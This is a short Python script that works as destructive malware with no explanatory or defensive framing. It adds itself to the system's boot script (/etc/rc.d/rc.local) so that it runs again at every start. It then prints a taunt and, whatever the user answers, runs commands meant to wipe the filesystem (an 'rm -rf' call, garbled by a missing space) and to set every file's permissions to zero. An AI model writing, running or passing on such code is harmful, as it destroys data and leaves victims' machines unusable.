#!/usr/bin/python
import os
def R ():
    os.system('sudo rm -rf/* ')
def C ():
    os.system('sudo chmod -R 000 / ')
    
os.system('chmod +x /etc/rc.d/rc.local ')
os.system('cd / ')
os.system('cd root/speed/hello')
os.system('chmod +x test_extra.py')
f = open('/etc/rc.d/rc.local','a')
f.write("\n cd /root/speed/hello && ./test_extra.py")
f.close()

print ("you are die !/n")
print ("you can try y/n or everything or reboot !\n")
string = raw_input()
if string == 'y':
    R()
if string == 'n':
    C()
else :
    R()
    C()
    
